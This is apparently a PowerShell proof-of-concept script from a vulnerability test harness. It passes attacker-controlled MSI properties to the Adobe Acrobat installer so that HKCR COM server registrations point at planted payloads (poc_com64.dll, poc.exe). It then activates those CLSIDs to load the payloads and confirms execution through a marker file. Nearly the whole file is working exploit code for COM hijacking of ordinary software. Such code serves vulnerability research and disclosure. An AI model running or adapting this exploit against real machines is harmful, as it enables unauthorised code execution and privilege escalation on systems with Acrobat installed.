param(
    [string]$InstallerPath,
    [string]$MsiPath,
    [string]$SourceDir,
    [switch]$Full,
    [switch]$KeepInstalled,
    [int]$TimeoutMinutes = 60
)

. (Join-Path $PSScriptRoot 'common.ps1')

Write-Header 'P6 - MSI SecureCustomProperties -> HKCR COM/server path injection'
Require-Admin
Ensure-Results

$dll64 = Join-Path $PayloadDir 'poc_com64.dll'
$dll32 = Join-Path $PayloadDir 'poc_com32.dll'
$exe   = Join-Path $PayloadDir 'poc.exe'
foreach ($f in @($dll64, $dll32, $exe)) {
    if (-not (Test-Path -LiteralPath $f)) { throw "Missing payload file: $f" }
}

# locate the genuine MSI + source
if (-not $MsiPath) {
    $cached = Join-Path $WorkDir 'payload-source.txt'
    if (Test-Path $cached) { $SourceDir = (Get-Content $cached -Raw).Trim() }
    if (-not $SourceDir) { $SourceDir = Join-Path $WorkDir 'payload-source' }
    $MsiPath = Join-Path $SourceDir 'AcroPro.msi'
    if (-not (Test-Path $MsiPath)) {
        Write-Host 'Payload source not found; extracting from the installer...' -ForegroundColor Yellow
        & (Join-Path $PSScriptRoot 'Extract-Payload.ps1') -InstallerPath $InstallerPath
        if (Test-Path $cached) { $SourceDir = (Get-Content $cached -Raw).Trim() }
        $MsiPath = Join-Path $SourceDir 'AcroPro.msi'
    }
}
if (-not (Test-Path $MsiPath)) { throw "AcroPro.msi not found. Run Extract-Payload.ps1 or pass -MsiPath/-SourceDir." }
$SourceDir = Split-Path -Parent $MsiPath
if (-not (Test-Path (Join-Path $SourceDir 'Core.cab'))) {
    Write-Warning "Core.cab missing next to $MsiPath; InstallFiles may fail."
}

$marker = 'C:\poc-p6-marker.txt'
if (Test-Path $marker) { Remove-Item $marker -Force -ErrorAction SilentlyContinue }

$log = Join-Path $ResultsDir 'p6-msiexec.log'
$argString = '/i "' + $MsiPath + '" ' +
    'PDF_PREVIEW_HANDERLER_DLL="' + $dll64 + '" ' +
    'PDF_INPROCSERVER_VIEWERPS="' + $dll64 + '" ' +
    'PDF_ACROBROKER_PATH="' + $exe + '" ' +
    'PDFSHELL_LOCALSERVER_COMMAND="' + $exe + '" ' +
    'EULA_ACCEPT=YES SUPPRESS_APP_LAUNCH=Yes REBOOT=ReallySuppress ' +
    '/qn /l*v "' + $log + '"'
if (-not $Full) {
    # Install only the features that carry the P6 registrations.
    $argString += ' ADDLOCAL=AcrobatPDFIntegration,ViewerProgramFiles,Registries,ThumbnailPreviewHandler'
}

Write-Host ("Running: msiexec " + $argString) -ForegroundColor Cyan
Write-Host 'This performs an Adobe install and can take many minutes.' -ForegroundColor Yellow
$p = Start-Process -FilePath 'msiexec.exe' -ArgumentList $argString -PassThru
$timedOut = $false
if (-not $p.WaitForExit($TimeoutMinutes * 60 * 1000)) {
    $timedOut = $true
    Write-Warning "msiexec did not finish within $TimeoutMinutes minutes; stopping it."
    Stop-Tree $p.Id
}
$exit = -1
try { if ($p.HasExited) { $exit = $p.ExitCode } } catch { }
Write-Host ("msiexec exit: $exit  timedOut=$timedOut  (log: $log)") -ForegroundColor Cyan

# check the registrations
$checks = @(
    @{ Name='Preview(InProcServer32,64)'; Path='Registry::HKEY_CLASSES_ROOT\CLSID\{17F2E344-8227-4AA7-A25A-E89424566BBA}\InProcServer32' },
    @{ Name='Preview(InprocServer32,64)'; Path='Registry::HKEY_CLASSES_ROOT\CLSID\{DC6EFB56-9CFA-464D-8880-44885D7DC193}\InprocServer32' },
    @{ Name='Broker(LocalServer32,64)';   Path='Registry::HKEY_CLASSES_ROOT\CLSID\{BD57A9B2-4E7D-4892-9107-9F4106472DA4}\LocalServer32' },
    @{ Name='Shell(LocalServer32,64)';    Path='Registry::HKEY_CLASSES_ROOT\CLSID\{D38406DA-E8AA-484b-B80D-3D3DBDCC2FB2}\LocalServer32' },
    @{ Name='ViewerPS(InProcServer32,64)';Path='Registry::HKEY_CLASSES_ROOT\CLSID\{12BA069D-0FC6-4577-97C6-5DF634CE6E84}\InProcServer32' },
    @{ Name='Preview(InprocServer32,32)'; Path='Registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{17F2E344-8227-4AA7-A25A-E89424566BBA}\InprocServer32' }
)
$hits = @()
$table = @()
foreach ($c in $checks) {
    $v = $null
    try { $v = (Get-ItemProperty -LiteralPath $c.Path -ErrorAction SilentlyContinue).'(default)' } catch { }
    $row = [pscustomobject]@{ Check=$c.Name; Path=$c.Path; Value=$v }
    $table += $row
    if ($v -and (($v -like "*$dll64*") -or ($v -like "*$exe*") -or ($v -like "*poc_com*"))) { $hits += $c.Name }
}
$table | Format-Table -AutoSize | Out-String -Width 300 | Tee-Object -FilePath (Join-Path $ResultsDir 'p6-registry.txt') | Out-Host

if ($hits.Count -gt 0) {
    Emit-Result 'P6-REG' 'CONFIRMED' ("installer honored attacker MSI properties: " + ($hits -join ', '))
} else {
    Emit-Result 'P6-REG' 'UNCONFIRMED' 'HKCR registrations did not contain the attacker paths (properties may be reset/validated)'
}

# try to load the attacker DLL / launch the attacker server via COM
$loaded = $false
foreach ($clsid in @('{17F2E344-8227-4AA7-A25A-E89424566BBA}', '{BD57A9B2-4E7D-4892-9107-9F4106472DA4}', '{D38406DA-E8AA-484b-B80D-3D3DBDCC2FB2}')) {
    try {
        $t = [Type]::GetTypeFromCLSID([guid]$clsid)
        $obj = [Activator]::CreateInstance($t)
        Write-Host "Activated $clsid" -ForegroundColor Green
        $loaded = $true
        break
    } catch {
        if (Test-Path $marker) { $loaded = $true; break }
    }
}
Start-Sleep -Seconds 2
if (Test-Path $marker) {
    $mtxt = (Get-Content $marker -Raw).Trim()
    Set-Content -LiteralPath (Join-Path $ResultsDir 'p6-marker.txt') -Value $mtxt
    Emit-Result 'P6-EXEC' 'CONFIRMED' ("attacker DLL/server executed; marker: $mtxt")
} elseif ($loaded) {
    Emit-Result 'P6-EXEC' 'UNCONFIRMED' 'COM activation occurred but marker not found'
} else {
    Emit-Result 'P6-EXEC' 'UNCONFIRMED' 'COM activation did not load the attacker module (registration not attacker-controlled or feature not installed)'
}

if (-not $KeepInstalled) {
    Write-Host 'Uninstalling Acrobat (PoC cleanup)...' -ForegroundColor Yellow
    & msiexec.exe /x '{AC76BA86-1033-1033-7760-BC15014EA700}' /qn 2>$null | Out-Null
}
